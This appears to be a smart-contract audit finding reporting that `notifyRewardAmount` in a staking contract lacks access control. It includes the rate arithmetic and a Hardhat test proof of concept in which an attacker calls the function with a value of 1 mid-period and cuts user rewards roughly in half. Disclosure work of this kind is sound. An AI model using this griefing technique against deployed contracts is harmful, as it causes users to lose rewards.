# Due to lack of access control in `notifyRewardAmount`, anyone can call this function with small values to disrupt the current reward rate

## Vulnerability Details

Attacker can call `notifyRewardAmount` at any time with any value bigger than 0 to disrupt the current reward rate.

For example if admin calls `notifyRewardAmount` with 604800 to start a period.

```text
state.rate = amount / state.duration;
state.rate = 604800 / 604800 // state.duration also equals 604800 - 1 week in seconds
state.rate = 1
```

If in the middle of the period an attacker calls `notifyRewardAmount` with the value 1, the rate would be decreased.

```text
remaining = state.periodFinish - block.timestamp;
remaining = = 604800 / 2 = 302400 (middle of the 1 week period)

leftover = remaining * state.rate;
leftover = 302400 * 1

state.rate = (amount + leftover) / state.duration;
state.rate = (1 + 302400) / 604800 = 0.5 // would round down to 0 in solidity, if using 18 decimals for rate and amounts, then it would be 0.5e18
```

## Coded POC

We can verify the disruption via the POC below. Please note there's more ways the attacker can disrupt/break the rate. For this POC we're demonstrating a scenario where the attacker calls `notifyRewardAmount` with 1 in the middle of a reward period.

The POC can be pasted in `token/tests/symmStaking.behavior.ts` inside "Reward Calculation" block, and executed with `npx hardhat test --grep "POC Sherlock"`

We can see that, without the attacker interference, the user rewards after one week would be 604797. But with the attacker interference it would be 302401.

```solidity
it("POC Sherlock: rewards without interference for 1 week would equal 604797n", async function () {
    const depositAmount = "604800"
    const rewardAmount = depositAmount

    await stakingToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
    await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
    await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [rewardAmount])

    await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
    await symmStaking.connect(user1).deposit(depositAmount, user1.address)

    await time.increase(604800)

    const user1BalanceBefore = await stakingToken.balanceOf(user1.address)
    await symmStaking.connect(user1).claimRewards()
    const user1BalanceAfter = await stakingToken.balanceOf(user1.address)
    const claimed = user1BalanceAfter - user1BalanceBefore

    expect(claimed).to.equal(604797n)
})

it("POC Sherlock: rewards with attacker interference in the middle of the 1 week period would equal 302401n", async function () {
    const depositAmount = "604800"
    const rewardAmount = depositAmount

    await stakingToken.connect(admin).approve(await symmStaking.getAddress(), rewardAmount)
    await symmStaking.connect(admin).configureRewardToken(await stakingToken.getAddress(), true)
    await symmStaking.connect(admin).notifyRewardAmount([await stakingToken.getAddress()], [rewardAmount])

    await stakingToken.connect(user1).approve(await symmStaking.getAddress(), depositAmount)
    await symmStaking.connect(user1).deposit(depositAmount, user1.address)

    await time.increase(604800 / 2)

    // Attacker calls notifyRewardAmount with a small value in the middle of the 1 week period.
    const attackerDepositAmount = "1"
    const attacker = user2
    await stakingToken.connect(attacker).approve(await symmStaking.getAddress(), attackerDepositAmount)
    await symmStaking.connect(attacker).notifyRewardAmount([await stakingToken.getAddress()], [attackerDepositAmount])

    await time.increase(604800 / 2)

    const user1BalanceBefore = await stakingToken.balanceOf(user1.address)
    await symmStaking.connect(user1).claimRewards()
    const user1BalanceAfter = await stakingToken.balanceOf(user1.address)
    const claimed = user1BalanceAfter - user1BalanceBefore

    expect(claimed).to.equal(302401n)
})
```

## Impact

User rewards will be affected and will result in loss of funds for users.

## Tools Used

Manual Review.

## Recommendations

Add access control in `notifyRewardAmount` so it can only be called by the admin or trusted addresses.
